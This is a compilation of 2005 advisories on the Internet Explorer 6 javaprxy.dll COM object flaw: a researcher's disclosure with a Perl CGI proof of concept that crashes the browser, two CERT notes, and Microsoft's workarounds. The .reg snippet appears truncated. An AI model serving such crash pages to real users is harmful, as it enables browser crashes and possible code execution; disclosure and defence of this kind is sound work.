             title: IE6 javaprxy.dll COM instantiation heap corruption
                    vulnerability
           program: Internet Explorer
vulnerable version: 6.0.2900.2180
          homepage: [www.microsoft.com](http://www.microsoft.com)
             found: 2005-06-17

==================================================================================

background:
---------------

Internet Explorer supports instantiation of non-ActiveX controls, e.g
COM objects, via <object> tags. according to M$, COM components respond
gracefully to attempts to treat them as non-ActiveX controls. on the
contrary, we found that at least 20 of the objects available on an
average XP system either lead to an instant crash or an exception after
a few reloads.

vulnerability overview:
---------------

Loading HTML documents with certain embedded CLSIDs results in
null-pointer exceptions or memory corruption. in one case, we could
leverage this bug to overwrite a function pointer in the data segment.
it *may* be possible to exploit this issue to execute arbitrary code in
the context of IE.

proof of concept:
---------------

this simple CGI should crash IE.

---------------

#!/usr/bin/perl

# in order for this to work javaprxy.dll must be available on the client.

my $clsid = '03D9F3F2-B0E3-11D2-B081-006008039BF0'; # javaprxy.dll

my $html1 = "<html><body>\n<object
classid=\"CLSID:".$clsid."\"></object>\n";
my $html2 = "\n</body><script>location.reload();</script></html>\n";

print "Content-Type: text/html;\r\n\r\n";

print $html1.("A"x30000).$html2;

---------------

on our lab machine, we, end up with eax=00410041, and an exception
occurs at the following location in javaprxy.dll:

---------------

.text:7C508660                 mov     eax, [ecx]
.text:7C508662                 test    eax, eax
.text:7C508664                 jz      short locret_7C50866C
.text:7C508666                 mov     ecx, [eax]
.text:7C508668                 push    eax
.text:7C508669                 call    dword ptr [ecx+8]

---------------

as you can see, this situation may be exploitable, considering that we
have some level of control over eax.

vulnerable versions:
---------------

javaprxy.dll 5.00.3810
internet explorer 6.0.2900.2180.xpsp_sp2_gdr.050301-1519

these are the versions tested, other versions may of course be vulnerable.

vendor status:
---------------
vendor notified: 2005-06-17
vendor response: 2005-06-17
patch available: ?

microsoft does not confirm the vulnerability, as their product team can
not reproduce condition. however, they are looking at making changes to
handle COM objects in a more robust manner in the future.

## Multiple COM objects cause memory corruption in Microsoft Internet Explorer

#### Vulnerability Note VU#959049

Original Release Date: 2005-08-09 | Last Revised: 2006-08-09

---

### Overview

Microsoft Internet Explorer (IE) allows instantiation of COM objects not designed for use in the browser, which may allow a remote attacker to execute arbitrary code or crash IE.

### Description

| **Microsoft COM**  [Microsoft COM](http://www.microsoft.com/com/default.mspx) is a technology that allows programmers to create reusable software components that can be incorporated into applications to extend their functionality. Microsoft COM includes COM+, Distributed COM (DCOM), and ActiveX Controls.**ActiveX controls**ActiveX controls are COM objects that have visual elements. ActiveX controls are traditionally designed to be used in Internet Explorer. A web page can make use of an ActiveX control in various ways, such as by referencing its Class Identifier (CLSID) in an HTML OBJECT tag.**The Problem**Internet Explorer will attempt to instantiate any COM object that is referenced by a web page. Certain COM objects that are not designed for use in Internet Explorer may cause unexpected results, such as executing arbitrary code or crashing the browser.Exploit code for these vulnerabilities are publicly available. |
| --- |

### Impact

| By convincing a user to view a specially crafted HTML document (e.g., a web page, an HTML email message, or an email attachment), an attacker could execute arbitrary code with the privileges of the user. The attacker could also cause IE (or the program using the WebBrowser control) to crash. |
| --- |

### Solution

| **Apply An Update**Apply the appropriate update, as specified in Microsoft Security Bulletin [MS06-042](http://www.microsoft.com/technet/security/Bulletin/MS06-042.mspx). This update sets the "kill bit" for certain CLSID values of COM objects known to be vulnerable. The MS06-042 update is similar to [MS06-021](http://www.microsoft.com/technet/security/Bulletin/MS06-021.mspx), [MS06-013](http://www.microsoft.com/technet/security/Bulletin/MS06-013.mspx), [MS05-054](http://www.microsoft.com/technet/security/bulletin/ms05-054.mspx), [MS05-037](http://www.microsoft.com/technet/security/bulletin/ms05-037.mspx), [MS05-038](http://www.microsoft.com/technet/security/bulletin/ms05-038.mspx), and [MS05-052](http://www.microsoft.com/technet/security/bulletin/ms05-052.mspx), but it includes additional COM objects. |
| --- |

| Microsoft has listed several workarounds in the [Microsoft Security Bulletin](http://www.microsoft.com/technet/security/bulletin/ms05-054.mspx), including disabling ActiveX controls. |

### General Information

## Executive Summary

**Executive Summary:**

This update resolves a newly-discovered, public vulnerability. A COM object, the JView Profiler (Javaprxy.dll), when instantiated in Internet Explorer, contains a remote code execution vulnerability that could allow an attacker to take complete control of an affected system. Since the JView Profiler COM object was not designed to be accessed through Internet Explorer, this update sets the [kill bit](https://support.microsoft.com/kb/240797) for the JView Profiler (Javaprxy.dll) COM object. The vulnerability is documented in the âVulnerability Detailsâ section of this bulletin.

If a user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

We recommend that customers apply the update immediately.

**Severity Ratings and Vulnerability Identifiers:**

| Vulnerability Identifiers | Impact of Vulnerability | Internet Explorer 5.01 Service Pack 4 | Internet Explorer 5.5 Service Pack 2 on Windows ME | Internet Explorer 6 Service Pack 1 (All supported operating system versions earlier than Windows Server 2003) | Internet Explorer 6 for Windows Server 2003 and Windows Server 2003 Service Pack 1 | Internet Explorer 6 for Windows XP Service Pack 2 |
| --- | --- | --- | --- | --- | --- | --- |
| JView Profiler Vulnerability - [CAN-2005-2087](https://cve.mitre.org/cgi-bin/cvename.cgi?name=can-2005-2087) | Remote Code Execution | Critical | Critical | Critical | Moderate | Critical |

This [assessment](https://go.microsoft.com/fwlink/?linkid=21140) is based on the types of systems that are affected by the vulnerability, their typical deployment patterns, and the effect that exploiting the vulnerability would have on them.

**Note** The severity ratings for non-x86 operating system versions map to the x86 operating systems versions as follows:

* The Internet Explorer 6 for Windows XP Professional x64 Edition severity rating is the same as the Internet Explorer 6 Service Pack 1 (All supported operating system versions earlier than Windows Server 2003) severity rating.
* The Internet Explorer 6 for Microsoft Windows Server 2003 for Itanium-based Systems and Windows Server 2003 x64 Edition severity rating is the same as the Internet Explorer 6 for Windows Server 2003 severity rating.

## Vulnerability Details

#### JView Profiler Vulnerability - CAN-2005-2087:

A remote code execution vulnerability exists in JView Profiler. An attacker could exploit the vulnerability by constructing a malicious Web page that could potentially allow remote code execution if a user visited the malicious Web site. An attacker who successfully exploited this vulnerability could take complete control of an affected system.

#### Mitigating Factors for JView Profiler Vulnerability - CAN-2005-2087:

* In a Web-based attack scenario, an attacker would have to host a Web site that contains a Web page that is used to exploit this vulnerability. An attacker would have no way to force users to visit a malicious Web site. Instead, an attacker would have to persuade them to visit the Web site, typically by getting them to click a link that takes them to the attacker's Web site.
* An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.
* The Microsoft Java Virtual Machine is not included in the following software by default:

  + Windows XP Service Pack 1a and Windows XP Service Pack 2
  + Windows Server 2003 and Windows Server 2003 Service Pack 1

  However, the Microsoft Java Virtual Machine may have been installed by an application. It could also be present as a result of upgrading the operating system. Customers can use the MSJVM [Diagnostic Tool](https://www.microsoft.com/download/details.aspx?familyid=4e38f4f9-ce7e-4271-8836-a7d7293a992f), which is available from the [Microsoft Java Virtual Machine Support page](https://www.microsoft.com/mscorp/java/). Customers can use this tool to perform remote and local scans to detect for the presence of MSJVM and MSJVM-related software. See the âHow do I know if I have the Javaprxy.dll on my system?â question in the FAQ section of this document for more information.
* The Restricted sites zone helps reduce attacks that could try to exploit this vulnerability by preventing ActiveX controls from being used when reading HTML e-mail. However, if a user clicks on a link within an e-mail they could still be vulnerable to this issue through the Web-based attack scenario described previously.

#### Workarounds for JView Profiler Vulnerability - CAN-2005-2087:

Microsoft has tested the following workarounds. While these workarounds will not correct the underlying vulnerability, they help block known attack vectors. The workarounds are mutually exclusive so users need only apply one to be secure. When a workaround reduces functionality, it is identified in the following section.

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX controls in these zones**

  You can help protect against this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls. You can do this by setting your browser security to **High**.

  To raise the browsing security level in Microsoft Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  Repeat steps 1 through 3 for the Local intranet security zone by clicking on the **Local intranet** icon.

  **Note** Setting the level to **High** may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to **High**.

  **Impact of Workaround:** User will be prompted prior to running ActiveX controls unless the Web site is in the userâs list of trusted sites.
* **Configure Internet Explorer to prompt before running ActiveX controls or disable ActiveX controls in the Internet and Local intranet security zone**

  You can help protect against this vulnerability by changing your settings to prompt before running ActiveX controls or disable ActiveX controls in the Internet and Local intranet security zone. To do this, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Click **Custom Level**.
  4. Under **Settings,** in the **ActiveX controls and plug-ins** section, under **Run ActiveX controls and plug-ins**, click **Prompt** or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings,** in the **ActiveX controls and plug-ins** section, under **Run ActiveX controls and plug-ins**, click **Prompt** or **Disable**, and then click **OK.**
  7. Click **OK** two times to return to Internet Explorer.

  **Impact of Workaround:** There are side effects to prompting before running ActiveX controls. Many Web sites that are on the Internet or on an intranet use ActiveX to provide additional functionality. For example, an online e-commerce site or banking site may use ActiveX controls to provide menus, ordering forms, or even account statements. Prompting before running ActiveX controls is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run ActiveX controls.
* **Un-register the Javaprxy.dll COM Object**

  To un-register Javaprxy.dll, follow these steps:

  1. Click **Start**, click **Run**, type "**regsvr32 /u javaprxy.dll**" (without the quotation marks), and then click **OK**.
  2. A dialog box appears to confirm that the un-registration process has succeeded. Click **OK** to close the dialog box.
  3. Close Internet Explorer, and reopen it for the changes to take effect.

  **Impact of Workaround:** Applications that require the Microsoft Java Virtual Machine may no longer function correctly.

  To undo this change, re-register Javaprxy.dll by following the above steps. Replace the text in Step 1 with **âregsvr32 %windir%\system32\javaprxy.dllâ** (without the quotation marks).
* **Modify the Access Control List on Javaprxy.dll to be more restrictive**

  To modify the Access Control List (ACL) on Javaprxy.dll to be more restrictive, follow these steps:

  1. Click **Start**, click **Run**, type "**cmd**" (without the quotation marks), and then click **OK**.
  2. Type the following command at a command prompt. Make a note of the current ACLs that are on the file (including inheritance settings) for future reference in case you have to undo this modification:

     **cacls %windir%\system32\javaprxy.dll**
  3. Type the following command at a command prompt to deny the âeveryoneâ group access to this file:

     **cacls %windir%\system32\javaprxy.dll /d everyone**
  4. Close Internet Explorer, and reopen it for the changes to take effect.

  **Impact of Workaround:** Applications that require the Microsoft Java Virtual Machine may no longer function correctly.
* **Restrict access to Javaprxy.dll in Internet Explorer by using a Software Restriction Policy**

  To restrict access to Javaprxy.dll in Internet Explorer on Windows XP and later versions you can create a [Software Restriction Policy](https://www.microsoft.com/technet/prodtechnol/winxppro/maintain/rstrplcy.mspx). To create this policy, use a registry script or create a Group Policy setting to block the loading of the Javaprxy.dll.

  **Note** Using Registry Editor incorrectly can cause serious problems that may require you to reinstall your operating system. Microsoft cannot guarantee that problems resulting from the incorrect use of Registry Editor can be solved. Use Registry Editor at your own risk. For information about how to edit the registry, view the "Changing Keys And Values" Help topic in Registry Editor (Regedit.exe) or view the "Add and Delete Information in the Registry" and "Edit Registry Data" Help topics in Regedt32.exe.

  We recommend that you back up the registry before you edit it.

  Use the following text to create a .reg file to un-register Javaprxy.dll in Internet Explorer. You can copy the following text, paste it into a text editor such as Notepad, and then save the file with the .reg file name extension. Run the .reg file on the vulnerable client.

  Windows Registry Editor Version 5.00
  [HKEY\_LOCAL\_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers]
  "TransparentEnabled"=dword:00000002

  00,72,00,78,00,79,00,2e,00,64,00,6c,00,6c,00,00,00

  **Impact of Workaround:** Applications that require the Microsoft Java Virtual Machine may no longer function correctly.
* **Remove the Microsoft Java Virtual Machine from your system using the Java Removal Tool**

  Customers can use the MSJVM [Diagnostic Tool](https://www.microsoft.com/download/details.aspx?familyid=4e38f4f9-ce7e-4271-8836-a7d7293a992f), available from the [Microsoft Java Virtual Machine Support page](https://www.microsoft.com/mscorp/java/), to perform remote and local scans to detect for the presence of MSJVM and MSJVM-related software.

  Customers can then use the Java Removal Tool to permanently remove the Microsoft Java Virtual Machine from their system. For more information about how to qualify for access to the Java Removal Tool from Microsoft Product Support Services, see [Microsoft Knowledge Base Article 826878](https://support.microsoft.com/kb/826878).

  **Warning:** Removing the Microsoft Java Virtual Machine from your system is permanent. Microsoft cannot provide Windows operating system recovery media to you that includes the MSJVM for reinstallation. Microsoft no longer includes the MSJVM in Windows operating system products.

  **Impact of Workaround:** Applications that require the Microsoft Java Virtual Machine will no longer function correctly.

## JVIEW Profiler (javaprxy.dll) COM object contains an unspecified vulnerability

#### Vulnerability Note VU#939605

Original Release Date: 2005-07-02 | Last Revised: 2005-07-12

---

### Overview

The JVIEW Profiler COM object contains an unspecified vulnerability, which may allow a remote attacker to execute arbitrary code on a vulnerable system.

### Description

| **Microsoft COM**  [Microsoft COM](http://www.microsoft.com/com/default.mspx) is a technology that allows programmers to create reusable software components that can be incorporated into applications to extend their functionality. Microsoft COM includes COM+, Distributed COM (DCOM), and ActiveX Controls.**ActiveX controls**ActiveX controls are COM objects that are designed to be used in Internet Explorer. A web page can make use of an ActiveX control through the use of the OBJECT tag.**JVIEW Profiler**The JVIEW Profiler is a COM object provided by javaprxy.dll, which is an interface to the debugger in the Microsoft Java Virtual Machine.**The Problem**Internet Explorer will attempt to instantiate any COM object that is referenced by a web page. COM objects that are not ActiveX controls may cause unexpected results, such as crashing Internet Explorer. The JVIEW Profiler COM object crashes in a way that can be exploited to execute arbitrary code on a vulnerable system. |
| --- |

### Impact

| By convincing a user to view a specially crafted HTML document (e.g., a web page or an HTML email message), an attacker could execute arbitrary code with the privileges of the user. The attacker could also cause IE (or the program using the WebBrowser control) to crash.Proof of concept code is publicly available. |
| --- |

### Solution

| **Apply An Update**Apply the appropriate update, as specified in the [Microsoft Security Bulletin](http://www.microsoft.com/technet/security/bulletin/ms05-037.mspx). This update sets the "kill bit" for the JVIEW Profiler COM object. |
| --- |

| Microsoft has listed several workarounds in the [Microsoft Security Bulletin](http://www.microsoft.com/technet/security/bulletin/ms05-037.mspx), including disabling ActiveX controls, disabling Active scripting, and unregistering javaprxy.dll. |
